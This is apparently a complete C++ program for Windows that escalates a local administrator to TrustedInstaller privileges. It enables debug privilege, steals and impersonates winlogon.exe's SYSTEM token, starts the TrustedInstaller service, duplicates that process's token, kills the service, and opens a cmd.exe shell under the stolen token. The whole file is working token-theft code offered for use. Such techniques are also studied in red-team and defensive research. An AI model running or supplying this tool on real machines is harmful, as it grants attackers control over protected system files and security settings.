#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <TlHelp32.h>
#include <comdef.h>
#include <cstdio>
#include <string>

/// <summary>
/// Displays a message, followed by the descriptor for a win32 error code
/// </summary>
/// <param name="msg">: message to display, precedes error description</param>
/// <param name="err">: win32 error code. optional.</param>
void PrintError(const char* msg, DWORD err = -1);
/// <summary>
/// Get a handle to the primary token of a process
/// </summary>
/// <param name="pid">: target process id. if value is 0, gets token for current process</param>
/// <returns>handle to the process' token</returns>
HANDLE GetProcessToken(DWORD pid);
/// <summary>
/// Duplicate a token with the specified type
/// </summary>
/// <param name="pid">: target process id</param>
/// <param name="type">: type of token (impersonation or primary)</param>
/// <returns>handle to the duplicate token</returns>
HANDLE DuplicateProcessToken(DWORD pid, TOKEN_TYPE type);
/// <summary>
/// enable or disable the specified privilege
/// </summary>
/// <param name="hToken">: handle to process token</param>
/// <param name="lpszPrivilege">: privilege name</param>
/// <param name="bEnablePrivilege">: TRUE to enable privilege, FALSE to disable</param>
/// <returns>win32 error code (0 on success)</returns>
DWORD SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege);
/// <summary>
/// enable debug privilege for current process
/// </summary>
/// <returns>true on success</returns>
bool GetDebugPrivilege();
/// <summary>
/// Get pid of process with specified name.
/// </summary>
/// <param name="procName">: name of executable file for process</param>
/// <returns>process id</returns>
DWORD GetPidByName(const wchar_t* procName);
/// <summary>
/// calls TerminateProcess
/// </summary>
/// <param name="pid">process id of target</param>
/// <returns>success</returns>
bool TerminateProcess(DWORD pid);

/// <summary>
/// get a shell with trustedinstaller privileges
/// </summary>
int main(int argc, char** argv) {
#pragma region get debug privilege
	// get debug privilege
	if (!GetDebugPrivilege()) {
		printf("[-] could not enable debug privilege. please run as a local administrator.");
		return -1;
	}
	printf("[+] enabled debug privilege\n");
#pragma endregion

#pragma region get target pid
	// pid
	DWORD pid;
	if (argc == 2)
		/*
		*  use 1st argument as target pid.
		*  target should be a system process, otherwise impersonating its token will not
		*  give sufficient permissions to allow accessing the trustedinstaller token
		*/
		pid = atoi(argv[1]);
	else
		pid = GetPidByName(L"winlogon.exe");
	if (pid == 0) return -1;  // unable to find process (or first argument was not an integer)
#pragma endregion

#pragma region impersonate system
	// duplicate system token as an impersonation token
	HANDLE hImpToken = DuplicateProcessToken(pid, TOKEN_TYPE::TokenImpersonation);
	if (hImpToken != INVALID_HANDLE_VALUE) printf("[+] process token duplicated\n");
	else { printf("[-] failed to duplicate token\n");  return -1; }

	// use the impersonation token
	HANDLE hThread = GetCurrentThread();
	if (!SetThreadToken(&hThread, hImpToken)) {
		PrintError("SetThreadToken()", GetLastError());
		return -1;
	}
	printf("[+] successfully impersonated\n");

	// don't need these handles anymore
	CloseHandle(hThread);
	CloseHandle(hImpToken);
#pragma endregion

#pragma region start trustedinstaller
	// get handle to trustedinstaller service
	SC_HANDLE hService = OpenServiceW(OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS), L"trustedinstaller", MAXIMUM_ALLOWED);
	if (!hService) {
		PrintError("OpenServiceW()", GetLastError());
		return -1;
	}
	// check if service is already running
	SERVICE_STATUS_PROCESS ssp = {}; DWORD bytesNeeded;
	if (!QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (BYTE*)&ssp, sizeof(ssp), &bytesNeeded)) {
		PrintError("QueryServiceStatusEx()", GetLastError());
		return -1;
	}
	// if running do nothing, otherwise start service and query again
	if (ssp.dwCurrentState == SERVICE_RUNNING) {
		printf("[+] trustedinstaller service already running\n");
	}
	else {
		// start
		if (!StartServiceW(hService, 0, NULL)) {
			PrintError("StartServiceW()", GetLastError());
			return -1;
		}
		printf("[+] started trustedinstaller service\n");

		// update ssp (interested in the pid)
		if (!QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (BYTE*)&ssp, sizeof(ssp), &bytesNeeded)) {
			PrintError("QueryServiceStatusEx()", GetLastError());
			return -1;
		}
	}
	CloseServiceHandle(hService);
#pragma endregion

#pragma region duplicate trustedinstaller token
	// get pid from service status query
	printf("[+] pid of trustedinstaller service: %d\n", ssp.dwProcessId);
	// duplicate token
	HANDLE hTrustedInstallerToken = DuplicateProcessToken(ssp.dwProcessId, TOKEN_TYPE::TokenPrimary);
	if (hTrustedInstallerToken != INVALID_HANDLE_VALUE) printf("[+] process token duplicated\n");
	else { printf("[-] failed to duplicate token\n");  return -1; }
#pragma endregion

#pragma region stop trustedinstaller service
	// stop service by killing process, as it does not accept SERVICE_CONTROL_STOP
	if (TerminateProcess(ssp.dwProcessId))
	{
		printf("[+] stopped trustedinstaller service\n");
	}
#pragma endregion

#pragma region stop trustedinstaller process
	if (TerminateProcess(GetPidByName(L"TrustedInstaller.exe")))
	{
		printf("[+] killed trustedinstaller process\n");
	}
#pragma endregion

#pragma region create process with trustedinstaller token
	// start new process with token
	STARTUPINFO si = {};
	PROCESS_INFORMATION pi = {};
	BOOL success = CreateProcessWithTokenW(hTrustedInstallerToken, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	if (!success) {
		PrintError("CreateProcessWithTokenW()", GetLastError());
		return -1;
	}
	printf("[+] created cmd process with trustedinstaller token\n");
	CloseHandle(hTrustedInstallerToken);
#pragma endregion

	return 0;
}

HANDLE GetProcessToken(DWORD pid) {
	HANDLE hCurrentProcess = {};
	HANDLE hToken = {};
	// get handle to process
	if (pid == 0)
	{
		hCurrentProcess = GetCurrentProcess();
	}
	else
	{
		hCurrentProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid);
		if (!hCurrentProcess)
		{
			PrintError("OpenProcess()", GetLastError());
			return INVALID_HANDLE_VALUE;
		}
	}
	// get handle to token
	if (!OpenProcessToken(hCurrentProcess, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &hToken))
	{
		PrintError("OpenProcessToken()", GetLastError());
		CloseHandle(hCurrentProcess);
		return INVALID_HANDLE_VALUE;
	}
	CloseHandle(hCurrentProcess);
	return hToken;
}

HANDLE DuplicateProcessToken(DWORD pid, TOKEN_TYPE tokenType) {
	// retrieve token
	HANDLE hToken = GetProcessToken(pid);
	if (hToken == INVALID_HANDLE_VALUE) return INVALID_HANDLE_VALUE;

	// args for DuplicateTokenEx
	SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
	HANDLE hNewToken = {};
	// duplicate the token
	if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &hNewToken)) {
		PrintError("DuplicateTokenEx()", GetLastError());
		CloseHandle(hToken);
		return INVALID_HANDLE_VALUE;
	}
	CloseHandle(hToken);
	return hNewToken;
}

void PrintError(const char* msg, DWORD err) {
	if (err == -1) {
		// only print message
		printf(" [-] %s.", msg);
		return;
	}
	// use winapi formatmessage to retrieve descriptor for error code
	wchar_t* msgBuf = nullptr;
	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, err, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (wchar_t*)&msgBuf, 0, NULL);
	_bstr_t b(msgBuf); const char* c = b;
	// print
	printf("[-] %s. err: %d %s", msg, err, c);
	LocalFree(msgBuf);
}

bool GetDebugPrivilege() {
	// pretty self explanatory
	HANDLE hProcess = GetCurrentProcess();
	HANDLE hToken;
	if (OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		DWORD errCode = SetPrivilege(hToken, SE_DEBUG_NAME, TRUE);
		// if errcode is 0 then operation was successful
		return errCode == 0;
	}
	return false;
}

DWORD SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
	LUID luid;
	// get current values for privilege
	if (LookupPrivilegeValueW(NULL, lpszPrivilege, &luid))
	{
		TOKEN_PRIVILEGES tp;
		memset(&tp, 0, sizeof(tp));
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
		// update this field
		tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;
		// adjust
		AdjustTokenPrivileges(hToken, FALSE, &tp, NULL, (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);
	}
	// return error code. 0 on success
	return GetLastError();
}

DWORD GetPidByName(const wchar_t* procName) {
	DWORD procId = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnap != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 procEntry;
		memset(&procEntry, 0, sizeof(procEntry));
		procEntry.dwSize = sizeof(procEntry);
		// iterate through every process, checking if process name matches target
		if (Process32First(hSnap, &procEntry)) {
			do {
				if (!lstrcmpW(procEntry.szExeFile, procName)) {
					procId = procEntry.th32ProcessID;
					wprintf(L"[+] found process '%s'. pid: %d\n", procName, procId);
					break;
				}
			} while (Process32Next(hSnap, &procEntry));
		}
	}
	CloseHandle(hSnap);
	return procId;
}

bool TerminateProcess(DWORD pid)
{
	if (pid == 0) return false;
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProc == INVALID_HANDLE_VALUE) {
		PrintError("OpenProcess()", GetLastError());
		return false;
	}
	bool flag = true;
	if (!TerminateProcess(hProc, 1)) {
		PrintError("TerminateProcess()", GetLastError());
		flag = false;
	}
	CloseHandle(hProc);
	return flag;
}